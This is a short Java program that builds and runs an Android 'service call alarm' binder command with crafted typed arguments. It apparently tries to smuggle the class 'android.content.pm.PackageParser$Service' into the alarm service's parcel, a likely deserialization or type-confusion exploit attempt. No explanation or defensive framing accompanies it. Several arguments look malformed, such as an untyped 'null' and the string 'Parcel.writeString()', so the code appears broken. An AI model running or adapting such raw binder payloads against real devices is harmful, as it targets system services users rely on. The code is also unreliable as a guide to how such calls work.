package com.example.csapp;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Main {

    public static class AlarmConfig {
        public int callingPackage = -1;
        public int type = 0;//
        public long triggerAtTime = 1;
        public long windowLength = 1;
        public long interval = 15;
        public int flags = 3;
        public int operation = 0;
        public String listener = "null";
        public int listenerTag = -1;
        public int workSource = 0;
        public int alarmClock = 1;
        public long mTriggerTime = 0;
        public String parcelableClass = "android.content.pm.PackageParser$Service";
        public int className = -1;
        public int metaData = -1;
        public int intentCount = 1;
        public String pooledStringClass = "Parcel.writeString()";
        public int padding = 0;
    }

    public static boolean setAlarm(AlarmConfig config) {
        try {
            String[] command = {
                    "service", "call", "alarm", "1",
                    "i32", String.valueOf(config.callingPackage),
                    "i32", String.valueOf(config.type),
                    "i64", String.valueOf(config.triggerAtTime),
                    "i64", String.valueOf(config.windowLength),
                    "i64", String.valueOf(config.interval),
                    "i32", String.valueOf(config.flags),
                    "i32", String.valueOf(config.operation),
                    config.listener,
                    "i32", String.valueOf(config.listenerTag),
                    "i32", String.valueOf(config.workSource),
                    "i32", String.valueOf(config.alarmClock),
                    "i64", String.valueOf(config.mTriggerTime),
                    "s16", config.parcelableClass,
                    "i32", String.valueOf(config.className),
                    "i32", String.valueOf(config.metaData),
                    "i32", String.valueOf(config.intentCount),
                    "s16", config.pooledStringClass,
                    "i32", String.valueOf(config.padding)
            };

            for (String arg : command) {
                System.out.print(arg + " ");
            }
            System.out.println("\n");

            ProcessBuilder pb = new ProcessBuilder(command);
            pb.redirectErrorStream(true);
            Process process = pb.start();

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    System.out.println("Output: " + line);
                }
            }

            int exitCode = process.waitFor();
            System.out.println("Process exited with code: " + exitCode);
            return exitCode == 0;

        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    public static void restart() {
        AlarmConfig config = new AlarmConfig();  // uses the exact values above
        setAlarm(config);
    }

    public static void main(String[] args) {
        restart();
    }
}